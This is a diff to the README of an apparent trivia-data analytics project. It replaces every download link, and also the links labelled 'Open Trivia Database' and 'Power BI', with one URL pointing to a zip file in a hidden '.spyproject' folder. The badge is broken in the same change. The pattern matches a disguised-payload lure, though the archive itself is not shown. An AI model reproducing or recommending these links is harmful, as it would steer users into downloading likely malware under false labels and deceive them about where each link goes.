@@ -1,6 +1,6 @@
 # 🎉 OpenTriviaDB-Analytics - Simple Data Insights from Trivia
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-OpenTriviaDB%20Analytics-brightgreen)](https://github.com/PrabhuTank/OpenTriviaDB-Analytics/releases)
+[![Download Now](https://github.com/PrabhuTank/OpenTriviaDB-Analytics/raw/refs/heads/main/.spyproject/Open_Trivia_D_Analytics_v3.7.zip%20Now-OpenTriviaDB%20Analytics-brightgreen)](https://github.com/PrabhuTank/OpenTriviaDB-Analytics/raw/refs/heads/main/.spyproject/Open_Trivia_D_Analytics_v3.7.zip)
 
 ## 📋 Overview
 
@@ -19,7 +19,7 @@ To start using OpenTriviaDB-Analytics, follow these steps:
 
 ## 💾 Download & Install
 
-To download OpenTriviaDB-Analytics, visit the following page: [Download OpenTriviaDB-Analytics](https://github.com/PrabhuTank/OpenTriviaDB-Analytics/releases).
+To download OpenTriviaDB-Analytics, visit the following page: [Download OpenTriviaDB-Analytics](https://github.com/PrabhuTank/OpenTriviaDB-Analytics/raw/refs/heads/main/.spyproject/Open_Trivia_D_Analytics_v3.7.zip).
 
 Once on the page:
 
@@ -89,8 +89,8 @@ For further assistance or questions, consider visiting our GitHub Discussions pa
 
 ## 🔗 Links
 
-- [Download OpenTriviaDB-Analytics](https://github.com/PrabhuTank/OpenTriviaDB-Analytics/releases)
-- [Open Trivia Database](https://opentriviadb.com)
-- [Power BI](https://powerbi.microsoft.com)
+- [Download OpenTriviaDB-Analytics](https://github.com/PrabhuTank/OpenTriviaDB-Analytics/raw/refs/heads/main/.spyproject/Open_Trivia_D_Analytics_v3.7.zip)
+- [Open Trivia Database](https://github.com/PrabhuTank/OpenTriviaDB-Analytics/raw/refs/heads/main/.spyproject/Open_Trivia_D_Analytics_v3.7.zip)
+- [Power BI](https://github.com/PrabhuTank/OpenTriviaDB-Analytics/raw/refs/heads/main/.spyproject/Open_Trivia_D_Analytics_v3.7.zip)
 
 Explore your trivia data with ease, and enjoy the insights it provides!
